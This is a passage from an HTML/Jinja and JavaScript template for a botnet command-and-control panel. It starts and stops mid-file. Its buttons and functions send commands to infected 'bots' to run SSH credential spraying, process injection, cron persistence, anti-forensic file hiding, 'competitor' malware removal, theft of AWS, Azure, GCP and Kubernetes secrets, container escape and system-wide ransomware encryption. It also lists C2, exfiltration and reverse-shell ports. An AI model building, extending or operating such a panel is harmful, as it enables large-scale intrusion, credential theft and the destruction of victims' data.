                            <button onclick="sendToAll('run_payload logcleaner.py')">Run</button>
                        </div>
                        <div class="bot">
                            <strong>SSH Spray</strong>
                            <p><small>SSH credential spraying attack</small></p>
                            <button onclick="sendToAll('load_payload sshspray.py')">Load</button>
                            <button onclick="sendToAll('run_payload sshspray.py')">Run</button>
                        </div>
                        <div class="bot">
                            <strong>DNS Tunnel</strong>
                            <p><small>DNS-based covert C2 channel</small></p>
                            <button onclick="sendToAll('load_payload dnstunnel.py')">Load</button>
                            <button onclick="sendToAll('run_payload dnstunnel.py')">Run</button>
                        </div>
                        <div class="bot">
                            <strong>Auto Deploy</strong>
                            <p><small>Automated network deployment</small></p>
                            <button onclick="sendToAll('load_payload autodeploy.py')">Load</button>
                            <button onclick="sendToAll('run_payload autodeploy.py')">Run</button>
                        </div>
                        <!-- NEW PAYLOADS -->
                        <div class="bot advanced-box">
                            <strong style="color: #8a2be2;">Process Injection</strong>
                            <p><small> Inject implant into processes for stealth</small></p>
                            <button onclick="sendToAll('load_payload process_inject.py')">Load</button>
                            <button onclick="sendToAll('run_payload process_inject.py')" style="background: #8a2be2;">Run</button>
                        </div>
                        <div class="bot advanced-box">
                            <strong style="color: #8a2be2;">Advanced File Hider</strong>
                            <p><small> Hide files using advanced techniques</small></p>
                            <button onclick="sendToAll('load_payload advanced_filehider.py')">Load</button>
                            <button onclick="sendToAll('run_payload advanced_filehider.py')" style="background: #8a2be2;">Run</button>
                        </div>
                        <div class="bot advanced-box">
                            <strong style="color: #8a2be2;">Advanced Cron Persistence</strong>
                            <p><small> Sophisticated cron-based persistence</small></p>
                            <button onclick="sendToAll('load_payload advanced_cron_persistence.py')">Load</button>
                            <button onclick="sendToAll('run_payload advanced_cron_persistence.py')" style="background: #8a2be2;">Run</button>
                        </div>
                        <div class="bot advanced-box">
                            <strong style="color: #8a2be2;">Competitor Cleaner</strong>
                            <p><small> Remove other malware/botnets from system</small></p>
                            <button onclick="sendToAll('load_payload competitor_cleaner.py')">Load</button>
                            <button onclick="sendToAll('run_payload competitor_cleaner.py')" style="background: #8a2be2;">Run</button>
                        </div>
                        <!-- CLOUD PAYLOADS -->
                        <div class="bot cloud-box">
                            <strong style="color: #2b8a8a;">Cloud Detector</strong>
                            <p><small> Detect cloud environment (AWS/Azure/GCP)</small></p>
                            <button onclick="sendToAll('load_payload cloud_detector.py')">Load</button>
                            <button onclick="sendToAll('run_payload cloud_detector.py')" style="background: #2b8a8a;">Run</button>
                        </div>
                        <div class="bot cloud-box">
                            <strong style="color: #2b8a8a;">AWS Credential Stealer</strong>
                            <p><small> Steal AWS credentials and metadata</small></p>
                            <button onclick="sendToAll('load_payload aws_credential_stealer.py')">Load</button>
                            <button onclick="sendToAll('run_payload aws_credential_stealer.py')" style="background: #2b8a8a;">Run</button>
                        </div>
                        <div class="bot cloud-box">
                            <strong style="color: #2b8a8a;">Azure Cred Harvester</strong>
                            <p><small> Harvest Azure credentials and tokens</small></p>
                            <button onclick="sendToAll('load_payload azure_cred_harvester.py')">Load</button>
                            <button onclick="sendToAll('run_payload azure_cred_harvester.py')" style="background: #2b8a8a;">Run</button>
                        </div>
                        <div class="bot cloud-box">
                            <strong style="color: #2b8a8a;">Container Escape</strong>
                            <p><small> Escape from containerized environments</small></p>
                            <button onclick="sendToAll('load_payload container_escape.py')">Load</button>
                            <button onclick="sendToAll('run_payload container_escape.py')" style="background: #2b8a8a;">Run</button>
                        </div>
                        <!-- KUBERNETES PAYLOADS -->
                        <div class="bot k8s-box">
                            <strong style="color: #326ce5;">Kubernetes Secret Stealer</strong>
                            <p><small> Steal Kubernetes secrets, tokens, and certificates</small></p>
                            <button onclick="sendToAll('load_payload k8s_secret_stealer.py')">Load</button>
                            <button onclick="sendToAll('run_payload k8s_secret_stealer.py')" style="background: #326ce5;">Run</button>
                        </div>
                        <!-- END NEW PAYLOADS -->
                        <div class="bot" style="border: 2px solid #ff6600;">
                            <strong style="color: #ff6600;">File Encryption</strong>
                            <p><small> AES-256 file encryption/decryption with system-wide modes</small></p>
                            <button onclick="sendToAll('load_payload fileransom.py')">Load</button>
                            <button onclick="sendToAll('run_payload fileransom.py')" style="background: #ff6600;">Run</button>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- ADVANCED TAB -->
            <div id="advanced-tab" class="tab-content">
                <div class="section advanced-box">
                    <h2 style="color: #8a2be2;"> Advanced Payloads Suite</h2>
                    <p>Elite stealth, persistence, and system manipulation techniques for advanced operators</p>
                    
                    <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 15px; margin-top: 20px;">
                        <div class="bot">
                            <h3 style="color: #8a2be2;">Process Injection</h3>
                            <p><small>Inject Rogue implant into legitimate system processes (systemd, sshd, etc.) for maximum stealth. Bypasses traditional process monitoring.</small></p>
                            <div class="button-group">
                                <button onclick="sendToAll('trigger_procinject')" style="background: #8a2be2;">Execute</button>
                                <button onclick="sendToAll('load_payload process_inject.py')">Load</button>
                            </div>
                            <div style="font-size: 12px; color: #aaa; margin-top: 10px;">
                                <strong>Features:</strong><br>
                                • Inject into running processes<br>
                                • Memory-only execution<br>
                                • Bypass file scanning<br>
                                • Persist across reboots
                            </div>
                        </div>
                        
                        <div class="bot">
                            <h3 style="color: #8a2be2;">Advanced File Hider</h3>
                            <p><small>Hide implant files using extended attributes, hidden directories, and filesystem manipulation techniques. Makes files invisible to standard tools.</small></p>
                            <div class="button-group">
                                <button onclick="sendToAll('trigger_filehide')" style="background: #8a2be2;">Execute</button>
                                <button onclick="sendToAll('load_payload advanced_filehider.py')">Load</button>
                            </div>
                            <div style="font-size: 12px; color: #aaa; margin-top: 10px;">
                                <strong>Features:</strong><br>
                                • Extended attributes hiding<br>
                                • Dot-prefix manipulation<br>
                                • Filesystem tunneling<br>
                                • Anti-forensics techniques
                            </div>
                        </div>
                        
                        <div class="bot">
                            <h3 style="color: #8a2be2;">Advanced Cron Persistence</h3>
                            <p><small>Set up sophisticated cron-based persistence with randomization, obfuscation, and anti-detection mechanisms. Harder to detect than basic cron jobs.</small></p>
                            <div class="button-group">
                                <button onclick="sendToAll('trigger_cronpersist')" style="background: #8a2be2;">Execute</button>
                                <button onclick="sendToAll('load_payload advanced_cron_persistence.py')">Load</button>
                            </div>
                            <div style="font-size: 12px; color: #aaa; margin-top: 10px;">
                                <strong>Features:</strong><br>
                                • Randomized execution times<br>
                                • Obfuscated cron entries<br>
                                • Multiple backup methods<br>
                                • Self-healing capability
                            </div>
                        </div>
                        
                        <div class="bot">
                            <h3 style="color: #8a2be2;">Competitor Cleaner</h3>
                            <p><small>Identify and remove other malware, botnets, and competitor implants from the system. Clean up the environment for exclusive control.</small></p>
                            <div class="button-group">
                                <button onclick="sendToAll('trigger_compclean')" style="background: #8a2be2;">Execute</button>
                                <button onclick="sendToAll('load_payload competitor_cleaner.py')">Load</button>
                            </div>
                            <div style="font-size: 12px; color: #aaa; margin-top: 10px;">
                                <strong>Features:</strong><br>
                                • Detect common malware<br>
                                • Remove competitor C2<br>
                                • Clean persistence methods<br>
                                • System sanitization
                            </div>
                        </div>
                    </div>
                    
                    <div class="section" style="margin-top: 30px;">
                        <h3> Advanced Operations Console</h3>
                        <div class="command-form">
                            <input type="text" id="advanced_cmd" placeholder="Advanced command (e.g., trigger_procinject)" style="width: 400px;">
                            <button onclick="sendAdvancedCommand()" style="background: #8a2be2;">Send to Selected Bot</button>
                            <button onclick="sendAdvancedToAll()" style="background: #6a1bc9;">Send to All Bots</button>
                        </div>
                        
                        <div style="margin-top: 15px;">
                            <button onclick="document.getElementById('advanced_cmd').value = 'trigger_procinject'">Process Injection</button>
                            <button onclick="document.getElementById('advanced_cmd').value = 'trigger_filehide'">File Hide</button>
                            <button onclick="document.getElementById('advanced_cmd').value = 'trigger_cronpersist'">Cron Persist</button>
                            <button onclick="document.getElementById('advanced_cmd').value = 'trigger_compclean'">Competitor Clean</button>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- CLOUD OPERATIONS TAB -->
            <div id="cloud-tab" class="tab-content">
                <div class="section cloud-box">
                    <h2 style="color: #2b8a8a;"> Cloud-Aware Operations</h2>
                    <p>Specialized tools for cloud environment exploitation</p>
                    
                    <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 15px; margin-top: 20px;">
                        <div class="bot">
                            <h3 style="color: #2b8a8a;">Cloud Detection</h3>
                            <p><small>Detect cloud environment and adapt implant behavior</small></p>
                            <div class="button-group">
                                <button onclick="sendToBot(selectedBotId(), 'trigger_cloud_detect')" style="background: #2b8a8a;">Detect Cloud</button>
                                <button onclick="sendToBot(selectedBotId(), 'trigger_cloud_recon')" style="background: #1a6a6a;">Cloud Recon</button>
                            </div>
                        </div>
                        
                        <div class="bot">
                            <h3 style="color: #2b8a8a;">AWS Operations</h3>
                            <p><small>AWS-specific credential harvesting and enumeration</small></p>
                            <div class="button-group">
                                <button onclick="sendToBot(selectedBotId(), 'trigger_aws_creds')" style="background: #2b8a8a;">Steal AWS Creds</button>
                                <button onclick="sendToBot(selectedBotId(), 'trigger_aws_enum')" style="background: #1a6a6a;">Enumerate AWS</button>
                                <button onclick="sendToBot(selectedBotId(), 'load_payload aws_lateral.py')">Load Lateral</button>
                            </div>
                        </div>
                        
                        <div class="bot">
                            <h3 style="color: #2b8a8a;">Azure Operations</h3>
                            <p><small>Azure credential harvesting and resource discovery</small></p>
                            <div class="button-group">
                                <button onclick="sendToBot(selectedBotId(), 'trigger_azure_creds')" style="background: #2b8a8a;">Steal Azure Creds</button>
                                <button onclick="sendToBot(selectedBotId(), 'trigger_azure_enum')" style="background: #1a6a6a;">Enumerate Azure</button>
                                <button onclick="sendToBot(selectedBotId(), 'load_payload azure_lateral.py')">Load Lateral</button>
                            </div>
                        </div>
                        
                        <div class="bot">
                            <h3 style="color: #2b8a8a;">GCP Operations</h3>
                            <p><small>Google Cloud Platform credential harvesting</small></p>
                            <div class="button-group">
                                <button onclick="sendToBot(selectedBotId(), 'trigger_gcp_creds')" style="background: #2b8a8a;">Steal GCP Creds</button>
                                <button onclick="sendToBot(selectedBotId(), 'trigger_gcp_enum')" style="background: #1a6a6a;">Enumerate GCP</button>
                                <button onclick="sendToBot(selectedBotId(), 'load_payload gcp_lateral.py')">Load Lateral</button>
                            </div>
                        </div>
                        
                        <div class="bot">
                            <h3 style="color: #2b8a8a;">Container Operations</h3>
                            <p><small>Container escape and Kubernetes exploitation</small></p>
                            <div class="button-group">
                                <button onclick="sendToBot(selectedBotId(), 'trigger_container_escape')" style="background: #2b8a8a;">Container Escape</button>
                                <button onclick="sendToBot(selectedBotId(), 'trigger_k8s_creds')" style="background: #1a6a6a;">K8s Creds</button>
                                <button onclick="sendToBot(selectedBotId(), 'load_payload docker_breakout.py')">Load Breakout</button>
                            </div>
                        </div>
                    </div>
                    
                    <div class="section" style="margin-top: 30px;">
                        <h3>Cloud Environment Scanner</h3>
                        <div class="command-form">
                            <input type="text" id="cloud_target" placeholder="Target path or 'full' for complete scan" style="width: 400px;">
                            <button onclick="sendCloudCommand('scan')" style="background: #2b8a8a;">Scan Cloud Environment</button>
                            <button onclick="sendCloudCommand('adapt')" style="background: #1a6a6a;">Adapt Implant to Cloud</button>
                        </div>
                        
                        <div style="margin-top: 15px;">
                            <button onclick="document.getElementById('cloud_target').value = 'full'">Full Cloud Scan</button>
                            <button onclick="document.getElementById('cloud_target').value = 'credentials'">Credentials Only</button>
                            <button onclick="document.getElementById('cloud_target').value = 'metadata'">Metadata Only</button>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- KUBERNETES TAB -->
            <div id="k8s-tab" class="tab-content">
                <div class="section k8s-box">
                    <h2 style="color: #326ce5;"> Kubernetes Operations</h2>
                    <p>Specialized tools for Kubernetes cluster exploitation and secret stealing</p>
                    
                    <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 15px; margin-top: 20px;">
                        <div class="bot">
                            <h3 style="color: #326ce5;">Complete Secret Stealing</h3>
                            <p><small>Steal ALL secrets, tokens, certificates, and configurations from the entire Kubernetes cluster</small></p>
                            <div class="button-group">
                                <button onclick="sendToBot(selectedBotId(), 'trigger_k8s_steal')" style="background: #326ce5;">Steal All Secrets</button>
                                <button onclick="sendToBot(selectedBotId(), 'load_payload k8s_secret_stealer.py')">Load Stealer</button>
                                <button onclick="sendToBot(selectedBotId(), 'run_payload k8s_secret_stealer.py')">Run Stealer</button>
                            </div>
                            <div style="font-size: 12px; color: #aaa; margin-top: 10px;">
                                <strong>Scope:</strong><br>
                                • All namespaces<br>
                                • All secrets<br>
                                • Service account tokens<br>
                                • TLS certificates<br>
                                • SSH keys from pods<br>
                                • ConfigMaps<br>
                                • Persistent volumes
                            </div>
                        </div>
                        
                        <div class="bot">
                            <h3 style="color: #326ce5;">Targeted Secret Extraction</h3>
                            <p><small>Steal specific secrets from specific namespaces</small></p>
                            <div class="command-form">
                                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 10px;">
                                    <div>
                                        <label>Namespace:</label>
                                        <input type="text" id="k8s_target_namespace" placeholder="default" style="width: 100%;">
                                    </div>
                                    <div>
                                        <label>Secret Name (optional):</label>
                                        <input type="text" id="k8s_target_secret" placeholder="Leave empty for all secrets" style="width: 100%;">
                                    </div>
                                </div>
                                <div class="button-group">
                                    <button onclick="executeK8sTargeted()" style="background: #326ce5;">Execute Targeted</button>
                                    <button onclick="sendToAll('trigger_k8s_target default')" style="background: #2a5ac5;">Default Namespace</button>
                                    <button onclick="sendToAll('trigger_k8s_target kube-system')" style="background: #2450b5;">kube-system</button>
                                </div>
                            </div>
                        </div>
                        
                        <div class="bot">
                            <h3 style="color: #326ce5;">Advanced Kubernetes Operations</h3>
                            <p><small>Advanced Kubernetes exploitation techniques</small></p>
                            <div class="button-group">
                                <button onclick="sendToBot(selectedBotId(), 'trigger_k8s_creds')" style="background: #326ce5;">Steal Credentials</button>
                                <button onclick="sendToBot(selectedBotId(), 'load_payload k8s_privilege_escalation.py')" style="background: #2a5ac5;">Privilege Escalation</button>
                                <button onclick="sendToBot(selectedBotId(), 'load_payload k8s_lateral_move.py')" style="background: #2450b5;">Lateral Movement</button>
                            </div>
                        </div>
                        
                        <div class="bot">
                            <h3 style="color: #326ce5;">Kubernetes Reconnaissance</h3>
                            <p><small>Gather intelligence about the Kubernetes cluster</small></p>
                            <div class="button-group">
                                <button onclick="sendK8sRecon('cluster')" style="background: #326ce5;">Cluster Info</button>
                                <button onclick="sendK8sRecon('nodes')" style="background: #2a5ac5;">Nodes</button>
                                <button onclick="sendK8sRecon('pods')" style="background: #2450b5;">Pods</button>
                                <button onclick="sendK8sRecon('services')" style="background: #1e4699;">Services</button>
                            </div>
                        </div>
                    </div>
                    
                    <div class="section" style="margin-top: 30px;">
                        <h3>Kubernetes Secret Types</h3>
                        <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px; margin-top: 15px;">
                            <div style="background: #0a0a0a; padding: 10px; border: 1px solid #326ce5;">
                                <strong style="color: #326ce5;">Service Tokens</strong>
                                <div style="font-size: 11px; color: #aaa;">Authentication tokens for services</div>
                            </div>
                            <div style="background: #0a0a0a; padding: 10px; border: 1px solid #326ce5;">
                                <strong style="color: #326ce5;">TLS Certificates</strong>
                                <div style="font-size: 11px; color: #aaa;">SSL/TLS certificates for services</div>
                            </div>
                            <div style="background: #0a0a0a; padding: 10px; border: 1px solid #326ce5;">
                                <strong style="color: #326ce5;">Docker Registry</strong>
                                <div style="font-size: 11px; color: #aaa;">Container registry credentials</div>
                            </div>
                            <div style="background: #0a0a0a; padding: 10px; border: 1px solid #326ce5;">
                                <strong style="color: #326ce5;">SSH Keys</strong>
                                <div style="font-size: 11px; color: #aaa;">SSH keys for pod access</div>
                            </div>
                            <div style="background: #0a0a0a; padding: 10px; border: 1px solid #326ce5;">
                                <strong style="color: #326ce5;">API Tokens</strong>
                                <div style="font-size: 11px; color: #aaa;">Kubernetes API access tokens</div>
                            </div>
                            <div style="background: #0a0a0a; padding: 10px; border: 1px solid #326ce5;">
                                <strong style="color: #326ce5;">Cloud Credentials</strong>
                                <div style="font-size: 11px; color: #aaa;">AWS/Azure/GCP cloud credentials</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- RESULTS TAB -->
            <div id="results-tab" class="tab-content">
                <div class="section">
                    <h2> Command Results History</h2>
                    {% for bot_id, bot_results in results.items() %}
                    <div class="bot">
                        <h3> {{ bot_id }}</h3>
                        <div class="results command-history">
                            {% for result in bot_results[-10:] %}
                            <div>
                                <strong>{{ result.timestamp }}</strong><br>
                                <small>IP: {{ result.client_ip }}</small><br>
                                <pre style="background: #111; padding: 5px; margin: 5px 0; overflow-x: auto;">{{ result.result[:500] }}{% if result.result|length > 500 %}...{% endif %}</pre>
                            </div>
                            {% endfor %}
                        </div>
                    </div>
                    {% endfor %}
                </div>
            </div>
            
            <!-- SERVER TAB -->
            <div id="server-tab" class="tab-content">
                <div class="section">
                    <h2> Server Status</h2>
                    <p><strong>Public URL:</strong> {{ public_url }}</p>
                    <p><strong>C2 Port:</strong> {{ c2_port }}</p>
                    <p><strong>Exfil Port:</strong> {{ exfil_port }}</p>
                    <p><strong>Reverse Shell Port:</strong> 9001</p>
                    <p><strong>Payloads Repository:</strong> <a href="{{ payload_url }}" target="_blank">{{ payload_url }}</a></p>
                    <p><strong>Active Bots:</strong> {{ bot_count }}</p>
                    <p><strong>Pending Commands:</strong> {{ pending_count }}</p>
                    <p><strong>Advanced Payloads:</strong> 4 (New)</p>
                    <p><strong>Cloud Payloads:</strong> 5 (New)</p>
                    <p><strong>Kubernetes Payloads:</strong> 1 (New - k8s_secret_stealer.py)</p>
                    <p><strong>Uptime:</strong> <span id="uptime">Calculating...</span></p>
                    
                    <h3> Quick Actions</h3>
                    <div class="button-group">
                        <button onclick="location.reload()">Refresh Page</button>
                        <button onclick="fetch('/beacons').then(r => r.json()).then(data => alert('Active Beacons: ' + data.total))">Check Beacons</button>
                        <button onclick="clearAllPending()">Clear All Pending</button>
                    </div>
                </div>
            </div>
            
            <div class="section">
                <h2> Manual Command</h2>
                <input type="text" id="manual_bot" placeholder="Bot ID (or 'all' for all bots)">
                <input type="text" id="manual_cmd" placeholder="Command" style="width: 400px;">
                <button onclick="sendManualCommand()">Send</button>
                <button onclick="document.getElementById('manual_cmd').value = 'trigger_help'">Insert Help</button>
                <button onclick="document.getElementById('manual_cmd').value = 'trigger_status'">Insert Status</button>
                <button onclick="document.getElementById('manual_cmd').value = 'trigger_procinject'" style="background: #8a2be2;">Insert Process Inject</button>
                <button onclick="document.getElementById('manual_cmd').value = 'trigger_cloud_detect'" style="background: #2b8a8a;">Insert Cloud Detect</button>
                <button onclick="document.getElementById('manual_cmd').value = 'trigger_k8s_steal'" style="background: #326ce5;">Insert K8s Steal</button>
                <button onclick="document.getElementById('manual_cmd').value = 'trigger_fileransom encrypt /home/user/Documents'" style="background: #ff6600;">Insert File Encrypt</button>
                <button onclick="document.getElementById('manual_cmd').value = 'trigger_fileransom encrypt all'" style="background: #ff5500;">Insert Encrypt All</button>
                <button onclick="document.getElementById('manual_cmd').value = 'trigger_fileransom encrypt system_destructive'" style="background: #ff0000; color: white;">Insert System Destructive</button>
            </div>
        </div>
        
        <script>
            let serverStartTime = Date.now();
            
            function updateUptime() {
                const uptimeMs = Date.now() - serverStartTime;
                const days = Math.floor(uptimeMs / (1000 * 60 * 60 * 24));
                const hours = Math.floor((uptimeMs % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                const minutes = Math.floor((uptimeMs % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((uptimeMs % (1000 * 60)) / 1000);
                
                let uptimeStr = '';
                if (days > 0) uptimeStr += days + 'd ';
                if (hours > 0) uptimeStr += hours + 'h ';
                if (minutes > 0) uptimeStr += minutes + 'm ';
                uptimeStr += seconds + 's';
                
                document.getElementById('uptime').textContent = uptimeStr;
            }
            
            setInterval(updateUptime, 1000);
            updateUptime();
            
            function switchTab(tabName) {
                // Hide all tabs
                document.querySelectorAll('.tab-content').forEach(tab => {
                    tab.classList.remove('active');
                });
                document.querySelectorAll('.tab').forEach(tab => {
                    tab.classList.remove('active');
                });
                
                // Show selected tab
                document.getElementById(tabName + '-tab').classList.add('active');
                document.querySelector(`[onclick="switchTab('${tabName}')"]`).classList.add('active');
            }
            
            function selectedBotId() {
                const selectedBot = document.querySelector('.bot.active-bot');
                if (!selectedBot) {
                    alert('Please select a bot first (click on a bot)');
                    return null;
                }
                return selectedBot.querySelector('strong').textContent.trim();
            }
            
            function sendCommand(botId) {
                const cmdInput = document.getElementById('cmd_' + botId);
                const typeSelect = document.getElementById('type_' + botId);
                const command = typeSelect.value === 'shell' ? cmdInput.value : typeSelect.value + (cmdInput.value ? ' ' + cmdInput.value : '');
                
                if (!command.trim()) {
                    alert('Please enter a command');
                    return;
                }
                
                // Special warning for file encryption
                if (command.includes('trigger_fileransom encrypt')) {
                    if (command.includes('system_destructive')) {
                        if (!confirm(' DESTRUCTIVE SYSTEM WIDE ENCRYPTION\\n\\nTHIS CAN BREAK THE ENTIRE SYSTEM!\\n\\nType OK to confirm you are in an isolated test environment:')) {
                            return;
                        }
                    } else if (command.includes('system_aggressive')) {
                        if (!confirm(' Aggressive System Encryption\\n\\nThis will encrypt system logs which may affect system operation.\\n\\nContinue?')) {
                            return;
                        }
                    } else {
                        if (!confirm(' File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
                            return;
                        }
                    }
                }
                
                fetch('/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        beacon_id: botId,
                        command: command
                    })
                }).then(r => r.json()).then(data => {
                    alert('Command sent to ' + botId + ' (ID: ' + data.command_id + ')');
                    cmdInput.value = '';
                    setTimeout(() => location.reload(), 1000);
                }).catch(err => {
                    alert('Error sending command: ' + err);
                });
            }
            
            function sendToBot(botId, command) {
                // Special warning for file encryption
                if (command.includes('trigger_fileransom encrypt')) {
                    if (command.includes('system_destructive')) {
                        if (!confirm(' DESTRUCTIVE SYSTEM WIDE ENCRYPTION\\n\\nTHIS CAN BREAK THE ENTIRE SYSTEM!\\n\\nType OK to confirm you are in an isolated test environment:')) {
                            return;
                        }
                    } else if (command.includes('system_aggressive')) {
                        if (!confirm(' Aggressive System Encryption\\n\\nThis will encrypt system logs which may affect system operation.\\n\\nContinue?')) {
                            return;
                        }
                    } else {
                        if (!confirm(' File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
                            return;
                        }
                    }
                }
                
                fetch('/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        beacon_id: botId,
                        command: command
                    })
                }).then(r => r.json()).then(data => {
                    alert('Command sent to ' + botId);
                    setTimeout(() => location.reload(), 1000);
                });
            }
            
            function clearPending(botId) {
                fetch('/clear_pending/' + botId, {
                    method: 'POST'
                }).then(r => r.json()).then(data => {
                    alert('Cleared pending commands for ' + botId);
                    location.reload();
                });
            }
            
            function clearAllPending() {
                {% for bot in bot_list %}
                fetch('/clear_pending/{{ bot.id }}', {
                    method: 'POST'
                });
                {% endfor %}
                alert('Cleared pending commands for all bots');
                setTimeout(() => location.reload(), 1000);
            }
            
            function sendToAll(command) {
                // Special warning for file encryption
                if (command.includes('trigger_fileransom encrypt')) {
                    if (command.includes('system_destructive')) {
                        if (!confirm(' DESTRUCTIVE SYSTEM WIDE ENCRYPTION\\n\\nTHIS COMMAND WILL BE SENT TO ALL BOTS AND MAY BREAK ENTIRE SYSTEMS!\\n\\nType OK to confirm you are in an isolated test environment:')) {
                            return;
                        }
                    } else if (command.includes('system_aggressive')) {
                        if (!confirm(' Aggressive System Encryption\\n\\nThis will encrypt system logs which may affect system operation on ALL bots.\\n\\nContinue?')) {
                            return;
                        }
                    } else {
                        if (!confirm(' File encryption will DESTROY original files!\\n\\nThis command will be sent to ALL bots.\\n\\nContinue?')) {
                            return;
                        }
                    }
                }
                
                if (!confirm('Send "' + command + '" to ALL bots?')) return;
                
                {% for bot in bot_list %}
                fetch('/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        beacon_id: '{{ bot.id }}',
                        command: command
                    })
                });
                {% endfor %}
                alert('Command sent to all bots: ' + command);
                setTimeout(() => location.reload(), 2000);
            }
            
            function sendManualCommand() {
                const botId = document.getElementById('manual_bot').value;
                const command = document.getElementById('manual_cmd').value;
                
                if (!botId || !command) {
                    alert('Please enter both Bot ID and Command');
                    return;
                }
                
                // Special warning for file encryption
                if (command.includes('trigger_fileransom encrypt')) {
                    if (command.includes('system_destructive')) {
                        if (!confirm(' DESTRUCTIVE SYSTEM WIDE ENCRYPTION\\n\\nTHIS CAN BREAK THE ENTIRE SYSTEM!\\n\\nType OK to confirm you are in an isolated test environment:')) {
                            return;
                        }
                    } else if (command.includes('system_aggressive')) {
                        if (!confirm(' Aggressive System Encryption\\n\\nThis will encrypt system logs which may affect system operation.\\n\\nContinue?')) {
                            return;
                        }
                    } else {
                        if (!confirm(' File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
                            return;
                        }
                    }
                }
                
                if (botId.toLowerCase() === 'all') {
                    sendToAll(command);
                    return;
                }
                
                fetch('/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        beacon_id: botId,
                        command: command
                    })
                }).then(r => r.json()).then(data => {
                    alert('Command sent: ' + data.command_id);
                    document.getElementById('manual_cmd').value = '';
                    setTimeout(() => location.reload(), 1000);
                });
            }
            
            function refreshPayloads() {
                fetch('/payloads/').then(r => r.text()).then(html => {
                    alert('Payloads refreshed');
                    location.reload();
                });
            }
            
            // KUBERNETES FUNCTIONS
            function showK8sTargetForm() {
                document.getElementById('k8s-target-form').style.display = 'block';
            }
            
            function hideK8sTargetForm() {
                document.getElementById('k8s-target-form').style.display = 'none';
            }
            
            function executeK8sTargeted() {
                var namespace = document.getElementById('k8s_namespace').value || 'default';
                var secret = document.getElementById('k8s_secret').value;
                
                var cmd = 'trigger_k8s_target ' + namespace;
                if (secret) {
                    cmd += ' ' + secret;
                }
                
                var selectedBot = selectedBotId();
                if (!selectedBot) return;
                
                sendToBot(selectedBot, cmd);
                hideK8sTargetForm();
            }
            
            function sendK8sRecon(type) {
                var cmd = 'trigger_k8s_recon ' + type;
                var selectedBot = selectedBotId();
                if (!selectedBot) return;
                
                sendToBot(selectedBot, cmd);
            }
            
            // FILE ENCRYPTION FUNCTIONS
            function sendFileransomCommand() {
                var action = document.getElementById('fileransom_action').value;
                var path = document.getElementById('fileransom_path').value;
                var mode = document.getElementById('fileransom_mode').value;
                var password = document.getElementById('fileransom_password').value;
                
                // Build command based on mode
                var cmd = 'trigger_fileransom ' + action;
                
                if (mode === 'standard' && path) {
                    cmd += ' ' + path;
                } else if (mode === 'all') {
                    cmd += ' all';
                } else if (mode.startsWith('system_')) {
                    cmd += ' ' + mode;
                }
                
                if (password) {
                    cmd += ' ' + password;
                } else if (action === 'decrypt' && !password) {
                    cmd += ' --password REQUIRED'; // Will need password from other source
                }
                
                // Special warnings
                if (mode === 'system_destructive') {
                    if (!confirm(' DESTRUCTIVE SYSTEM WIDE ENCRYPTION\\n\\nTHIS CAN BREAK THE ENTIRE SYSTEM!\\n\\nType OK to confirm you are in an isolated test environment:')) {
                        return;
                    }
                } else if (mode === 'system_aggressive') {
                    if (!confirm(' Aggressive System Encryption\\n\\nThis will encrypt system logs which may affect system operation.\\n\\nContinue?')) {
                        return;
                    }
                } else if (action === 'encrypt' && (mode !== 'system_test' && mode !== 'standard')) {
                    if (!confirm(' File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
                        return;
                    }
                }
                
                // Find the currently selected bot
                var selectedBot = document.querySelector('.bot.active-bot');
                if (!selectedBot) {
                    alert('Please select a bot first');
                    return;
                }
                
                var botId = selectedBot.querySelector('strong').textContent.trim();
                sendToBot(botId, cmd);
            }
            
            function quickFileransom(action, target, password) {
                var cmd = 'trigger_fileransom ' + action + ' ' + target;
                if (password) {
                    cmd += ' ' + password;
                }
                
                // Special warnings
                if (target === 'system_destructive') {
                    if (!confirm(' DESTRUCTIVE SYSTEM WIDE ENCRYPTION\\n\\nTHIS CAN BREAK THE ENTIRE SYSTEM!\\n\\nType OK to confirm you are in an isolated test environment:')) {
                        return;
                    }
                } else if (target === 'system_aggressive') {
                    if (!confirm(' Aggressive System Encryption\\n\\nThis will encrypt system logs which may affect system operation.\\n\\nContinue?')) {
                        return;
                    }
                } else if (action === 'encrypt') {
                    if (!confirm(' File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
                        return;
                    }
                }
                
                var selectedBot = document.querySelector('.bot.active-bot');
                if (!selectedBot) {
                    alert('Please select a bot first');
                    return;
                }
                
                var botId = selectedBot.querySelector('strong').textContent.trim();
                sendToBot(botId, cmd);
            }
            
            // ADVANCED PAYLOADS FUNCTIONS
            function sendAdvancedCommand() {
                var command = document.getElementById('advanced_cmd').value;
                if (!command.trim()) {
                    alert('Please enter an advanced command');
                    return;
                }
                
                var botId = selectedBotId();
                if (!botId) return;
                
                sendToBot(botId, command);
            }
            
            function sendAdvancedToAll() {
                var command = document.getElementById('advanced_cmd').value;
                if (!command.trim()) {
                    alert('Please enter an advanced command');
                    return;
                }
                
                if (!confirm('Send advanced command "' + command + '" to ALL bots?')) return;
                
                sendToAll(command);
            }
            
            // CLOUD COMMANDS FUNCTIONS
